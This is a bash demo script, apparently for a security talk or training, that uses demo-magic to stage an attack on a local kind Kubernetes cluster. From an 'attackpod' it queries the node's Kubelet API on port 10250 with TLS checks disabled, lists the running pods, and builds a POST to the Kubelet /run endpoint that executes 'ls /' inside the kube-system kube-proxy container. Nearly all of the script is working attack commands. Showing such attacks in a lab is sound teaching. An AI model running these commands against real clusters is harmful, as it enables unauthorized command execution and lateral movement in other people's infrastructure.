#!/bin/bash

########################
# include the magic
########################
. ./lib/demo-magic.sh
TYPE_SPEED=25
kubectx kind-kind 2> /dev/null 1> /dev/null
clear

ATTACKPOD="$(kubectl get pod -l run=attackpod -o name| head -1 | sed -e 's#^pod\/##g')"
p "# Use the same attack pod to curl the local node's Kubelet API\n directly on port 10250"
pe "kubectl exec -it $ATTACKPOD -- /bin/sh -c \"curl -sk https://172.22.0.3:10250/runningpods/ | jq -r '.items[]'\""
pe "clear"

PODNAME=`kubectl exec -it $ATTACKPOD -- /bin/sh -c "curl -sk https://172.22.0.3:10250/runningpods/ | jq -r '.items[] | select(.spec.containers[0].name==\"kube-proxy\") | .metadata.name'" |tr -d '\n' | tr -d '\r'`

p "# With the namespace, pod name, and container name, we can run commands"
# Have to manually paste this to avoid bash escaping hell
echo "kubectl exec -it $ATTACKPOD -- /bin/sh -c \"curl -sk -XPOST -d 'cmd=ls /' https://172.22.0.3:10250/run/kube-system/$PODNAME/kube-proxy\"" | pbcopy

#./cleanup.sh
